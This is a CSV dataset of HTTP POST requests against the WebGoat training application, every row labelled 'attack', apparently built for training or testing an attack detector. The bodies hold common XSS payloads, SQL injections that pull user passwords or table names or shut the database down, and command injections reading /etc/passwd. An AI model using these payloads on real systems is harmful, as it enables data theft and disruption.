source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=uMTvRAqr,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=IrpQcywZ,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8911'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2878'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2842'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4466'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=zg4VWeLS,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=6kwkRFfA,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '32jeX6hD'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=S5x6cLNV,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=IP9AAwZM,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4164'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=nF586Ijv,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4708'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'LbgY222Z'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9137'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=WiVzoE1W,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=emfdZYMb,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3079'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4474'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=bjzsmS7t,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3909'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'pC0aCGsO'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4018'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2938'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=QukYjKG7,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=1EShuhVB,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=FDfFSGu4,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '43chThXU'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=Po7BjeDJ,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5274'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6356'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8177'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=uBZ7hLl9,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Utc4Fhac'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6504'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7857'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'HOFZhhfi'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=7LwEvm0T,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'JQDQuTEd'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6896'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6780'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6176'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1168'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'bOWZhS53'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Y8rhHk98,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=xLLLY0HX,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=G7VT8S1f,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'tAqBK8cq'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=6bQAvBiH,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Ld5eBZfc,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1967'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=1PIaw79W,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=pSwIyEtd,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6386'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', '7SnIMxKG'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'hvD5ujSJ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Bx10TZWh'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5752'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8021'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'aQsN6SJ3'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5979'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'j4rp2AJZ'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3454'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=qVum1pKd,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '8UD4ZISC'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'TxtV0pLQ'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5613'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=RvlSZXwW,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '3tbDRZ4D'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1358'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=0fV9DWCz,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'S5qfNNqJ'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=W3veSJ1l,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=NuAzY6wT,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'gWVXVQLW'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '8i2Myeil'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=uucCNt0T,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'iJvTjSzf'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=uwAVs39a,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6144'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1450'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=7RhOWop7,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=oxo7R5EF,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3983'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QgVhZg4I'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4420'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=P1fBVrCU,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=1ce7bbFE,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9510'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'havueCwE'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'UNZqowBS'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9817'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=Cle0hiTl,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6181'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4473'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7286'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5743'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=IpC5RNXH,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=soONSICR,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=tmO4wTuI,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=hi7obGzH,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5292'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=dhz361XQ,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'tINjYc0D'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'q8KFzFNp'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=HITwrVQ0,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'nHSGe2yX'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=ptxfthrD,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9237'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=bsqqHlPx,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Vovgw2Ua'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Mpih6uAW,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1071'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XNqk2PiJ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'dBtUFY1r'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '8C6Dna1p'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=RONihZo2,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=JGQs5TVV,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7893'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'bpaucWJS'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=GgVvZsjf,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '7ISEehpT'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7898'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1887'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9358'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'quYzJY3W'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'UpkfgteV'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2014'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XxKH57EX'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=EXSkOscT,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7357'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1289'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=2aJLkGMd,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6961'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'guaR0vWk'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '4LNjRd5C'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2714'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=zFthiG90,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9428'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2661'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=zZYKvyJs,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '3MqqJS4Q'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8649'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2277'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=zdv5md7m,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5315'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'h1uJWyvm'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'AhCv69ST'), ('ip', '127.0.0.1 & whoami')]",404,14753
